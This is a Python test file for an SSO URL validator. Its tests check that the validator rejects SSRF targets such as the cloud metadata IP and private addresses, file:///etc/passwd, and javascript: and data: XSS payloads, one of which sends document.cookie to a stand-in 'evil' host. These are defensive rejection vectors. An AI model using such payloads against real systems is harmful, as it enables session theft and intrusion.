import socket

import pytest

from identity_access_management_context.adapters.secondary import SsoUrlValidator
from identity_access_management_context.domain.exceptions import (
    DisallowedSsoEndpointException,
)


def _fake_getaddrinfo(ip: str):
    def _resolver(host, port, *args, **kwargs):
        family = socket.AF_INET6 if ":" in ip else socket.AF_INET
        return [(family, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, port))]

    return _resolver


class TestSsoUrlValidatorStrict:
    def test_should_accept_https_public_host(self, monkeypatch):
        monkeypatch.setattr(socket, "getaddrinfo", _fake_getaddrinfo("93.184.216.34"))
        SsoUrlValidator().validate("https://accounts.google.com/.well-known/openid_configuration")

    def test_should_reject_http_scheme(self):
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate("http://accounts.google.com/.well-known/openid_configuration")

    def test_should_reject_missing_host(self):
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate("https:///no-host")

    @pytest.mark.parametrize(
        "ip",
        [
            "169.254.169.254",  # cloud metadata (IMDS)
            "127.0.0.1",
            "10.0.0.5",
            "172.16.0.1",
            "192.168.1.1",
            "::1",
            "0.0.0.0",  # noqa: S104 — intentional SSRF test vector (unspecified address)
        ],
    )
    def test_should_reject_internal_ip(self, monkeypatch, ip):
        monkeypatch.setattr(socket, "getaddrinfo", _fake_getaddrinfo(ip))
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate("https://internal.example.com/.well-known/openid_configuration")

    def test_should_reject_public_host_rebinding_to_private_ip(self, monkeypatch):
        monkeypatch.setattr(socket, "getaddrinfo", _fake_getaddrinfo("10.1.2.3"))
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate("https://evil.example.com/.well-known/openid_configuration")

    def test_should_reject_unresolvable_host(self, monkeypatch):
        def _boom(*args, **kwargs):
            raise socket.gaierror("name resolution failed")

        monkeypatch.setattr(socket, "getaddrinfo", _boom)
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate("https://does-not-exist.invalid/.well-known/openid_configuration")


class TestSsoUrlValidatorPermissive:
    def test_should_allow_http_localhost_when_private_networks_allowed(self):
        SsoUrlValidator(allow_private_networks=True).validate("http://localhost:8080/.well-known/openid-configuration")

    def test_should_still_reject_non_http_scheme(self):
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator(allow_private_networks=True).validate("file:///etc/passwd")


class TestSsoUrlValidatorSchemeOnly:
    """validate_scheme guards a URL handed to a browser (no server-side request),
    so it checks only the scheme/host and never resolves DNS."""

    @pytest.mark.parametrize(
        "url",
        [
            "javascript:fetch('//evil?c='+document.cookie)",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
            "https:///no-host",
            "not-a-url",
            "",
        ],
    )
    def test_should_reject_dangerous_or_malformed_scheme(self, url):
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate_scheme(url)

    def test_should_accept_https_without_dns_lookup(self, monkeypatch):
        # Would blow up if a DNS resolution were attempted.
        def _boom(*args, **kwargs):
            raise AssertionError("validate_scheme must not resolve DNS")

        monkeypatch.setattr(socket, "getaddrinfo", _boom)
        SsoUrlValidator().validate_scheme("https://accounts.google.com/authorize")

    def test_should_reject_http_in_strict_mode(self):
        with pytest.raises(DisallowedSsoEndpointException):
            SsoUrlValidator().validate_scheme("http://accounts.google.com/authorize")

    def test_should_allow_http_in_permissive_mode(self):
        SsoUrlValidator(allow_private_networks=True).validate_scheme("http://localhost:8080/authorize")
